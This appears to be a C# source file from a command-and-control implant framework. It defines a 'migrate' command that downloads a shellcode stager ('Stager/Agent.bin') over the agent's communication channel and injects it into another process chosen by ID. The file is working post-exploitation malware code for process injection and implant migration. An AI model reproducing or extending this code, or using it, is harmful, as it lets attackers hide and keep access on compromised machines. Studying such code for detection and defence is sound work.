using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class MigrateCommand : AgentCommand
    {
        public override string Name => "migrate";

        public const string ShellCodePath = "Stager/Agent.bin";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length < 1)
            {
                result.Result = $"Usage: {this.Name} ProcessId";
                return;
            }

            var fileName = ShellCodePath;
            var fileContent = commm.Download(fileName, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
            }).Result;

            this.Notify(result, commm, $"{fileName} Downloaded");

            var shellcode = fileContent;

            int processId = int.Parse(task.SplittedArgs[0]);

            var process = Process.GetProcessById(processId);
            if(process == null)
            {
                result.Result = $"Unable to fin process with Id {processId}";
                return;
            }

            var injectRes = Injector.Inject(process, shellcode, false);
            if (!injectRes.Succeed)
                result.Result += $"Migration failed : {injectRes.Error}";
            else
            {
                result.Result += $"Migration succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    result.Result += injectRes.Output;
            }


            
        }
    }
}
